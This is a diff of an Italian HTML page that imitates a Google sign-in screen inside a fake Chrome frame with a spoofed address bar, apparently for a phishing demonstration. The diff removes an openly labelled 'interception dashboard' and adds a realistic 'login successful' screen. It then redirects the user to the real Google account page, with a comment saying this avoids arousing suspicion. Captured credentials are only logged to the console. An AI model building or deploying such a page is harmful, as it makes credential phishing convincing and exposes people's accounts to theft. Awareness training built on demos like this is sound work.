@@ -4,70 +4,68 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google - Accedi</title>
-    <!-- Icone per i pulsanti del browser -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <style>
         * { box-sizing: border-box; }
         body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', arial, sans-serif; background-color: #ffffff; overflow: hidden; }
 
-        /* Struttura del finto Browser */
+        /* Struttura Browser */
         #browser-ui { display: flex; flex-direction: column; height: 100vh; width: 100vw; background: white; }
-
-        /* Barra superiore grigia (Chrome Style) */
         .chrome-bar { background: #dee1e6; padding: 8px 12px; display: flex; align-items: center; gap: 15px; }
         .address-bar { flex-grow: 1; background: #f1f3f4; border-radius: 20px; padding: 6px 15px; display: flex; align-items: center; font-size: 14px; }
         .address-bar i { color: #188038; margin-right: 8px; font-size: 12px; }
         .address-bar input { border: none; background: transparent; width: 100%; outline: none; color: #202124; }
 
-        /* Area Login Google */
+        /* Login Box */
         .content { flex-grow: 1; display: flex; justify-content: center; align-items: center; }
         .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 450px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 10px; }
+        .logo-container { height: 40px; margin-bottom: 12px; display: flex; justify-content: center; }
+        .logo { height: 35px; }
         h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
         p { font-size: 16px; margin-bottom: 30px; color: #202124; }
 
-        /* Campi Input */
-        .input-field { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
-        .input-field:focus { border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        .input-label { display: block; font-size: 14px; color: #202124; margin-bottom: 8px; font-weight: 500; }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
 
-        /* Pulsante Avanti */
         .btn-row { display: flex; justify-content: flex-end; margin-top: 30px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
 
-        /* Dashboard Hacker (Nascosta) */
-        #hacker-panel {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; padding: 40px; z-index: 1000;
-        }
-        .console-text { border-left: 3px solid #238636; padding-left: 15px; margin-bottom: 20px; }
-        .data-highlight { color: #7ee787; font-weight: bold; font-size: 1.2em; }
+        /* Schermata di Successo (Vittima) */
+        #success-screen { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div id="browser-ui">
-        <!-- Toolbar simulata -->
         <div class="chrome-bar">
-            <div style="color: #5f6368; display: flex; gap: 10px;">
-                <i class="fa fa-arrow-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-repeat"></i>
-            </div>
+            <div style="color: #5f6368; display: flex; gap: 10px;"><i class="fa fa-arrow-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-repeat"></i></div>
             <div class="address-bar">
                 <i class="fa fa-lock"></i>
                 <input type="text" value="https://accounts.google.com/signin/v2/identifier" readonly>
             </div>
-            <i class="fa fa-ellipsis-v" style="color: #5f6368;"></i>
         </div>
 
-        <!-- Pagina Phishing -->
         <div class="content" id="phishing-page">
             <div class="login-box">
-                <!-- Logo Google ufficiale via HTTPS -->
-                <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+                <div class="logo-container">
+                    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+                </div>
                 <h1>Accedi</h1>
                 <p>Utilizza il tuo Account Google</p>
-                <input type="email" id="fake_user" class="input-field" placeholder="Email o telefono">
-                <input type="password" id="fake_pass" class="input-field" placeholder="Inserisci la password">
-                <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;">Password dimenticata?</div>
+                
+                <div class="input-group">
+                    <span class="input-label">Email o telefono</span>
+                    <input type="email" id="fake_user" class="input-field" placeholder="esempio@gmail.com">
+                </div>
+
+                <div class="input-group">
+                    <span class="input-label">Inserisci la password</span>
+                    <input type="password" id="fake_pass" class="input-field" placeholder="Password">
+                </div>
+
                 <div class="btn-row">
                     <button onclick="captureData()">Avanti</button>
                 </div>
@@ -75,23 +73,11 @@
         </div>
     </div>
 
-    <!-- Schermata di Dimostrazione Attacco -->
-    <div id="hacker-panel">
-        <h1>[DASHBOARD INTERCETTAZIONE]</h1>
-        <div class="console-text">
-            <p>> Pacchetti ricevuti sulla porta 443...</p>
-            <p style="color: #f85149;">> ALERT: Credenziali estratte dal form!</p>
-        </div>
-        <div style="background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 6px;">
-            <p><strong>TIMESTAMP:</strong> <span id="time-log"></span></p>
-            <p><strong>EMAIL INTERCETTATA:</strong> <span id="res-user" class="data-highlight"></span></p>
-            <p><strong>PASSWORD INTERCETTATA:</strong> <span id="res-pass" class="data-highlight"></span></p>
-        </div>
-        <p style="margin-top: 30px; color: #8b949e;">
-            In una situazione reale, lo script invierebbe ora i dati al database.<br>
-            La vittima verrebbe reindirizzata al sito ufficiale senza accorgersi del furto.
-        </p>
-        <button onclick="location.reload()" style="background: #238636; color: white; margin-top: 20px; padding: 10px 20px;">Ricomincia Simulazione</button>
+    <!-- Messaggio Accesso Riuscito -->
+    <div id="success-screen">
+        <div class="loader"></div>
+        <h2 style="font-family: sans-serif; color: #202124;">Accesso riuscito</h2>
+        <p style="font-family: sans-serif; color: #5f6368;">Reindirizzamento in corso alla tua dashboard...</p>
     </div>
 
     <script>
@@ -99,19 +85,23 @@
             const user = document.getElementById('fake_user').value;
             const pass = document.getElementById('fake_pass').value;
 
-            if(!user || !pass) {
-                alert("Inserisci dati simulati per far funzionare la demo.");
-                return;
-            }
+            if(!user || !pass) { alert("Inserisci i dati!"); return; }
 
-            // Popola i risultati
-            document.getElementById('res-user').innerText = user;
-            document.getElementById('res-pass').innerText = pass;
-            document.getElementById('time-log').innerText = new Date().toLocaleString();
+            // 1. SALVATAGGIO SIMULATO
+            // In una presentazione, spiegherai che qui i dati vengono inviati a un server.
+            console.log("DATI CATTURATI E SALVATI NEL DATABASE DELL'ATTACCANTE:");
+            console.log("User: " + user);
+            console.log("Pass: " + pass);
 
-            // Cambio schermata
+            // 2. NASCONDI LA PAGINA E MOSTRA SUCCESSO
             document.getElementById('browser-ui').style.display = 'none';
-            document.getElementById('hacker-panel').style.display = 'block';
+            document.getElementById('success-screen').style.display = 'flex';
+
+            // 3. REINDIRIZZAMENTO DOPO 3 SECONDI
+            setTimeout(function() {
+                // Rimanda al vero Google per non destare sospetti
+                window.location.href = "https://myaccount.google.com/";
+            }, 3000);
         }
     </script>
 </body>
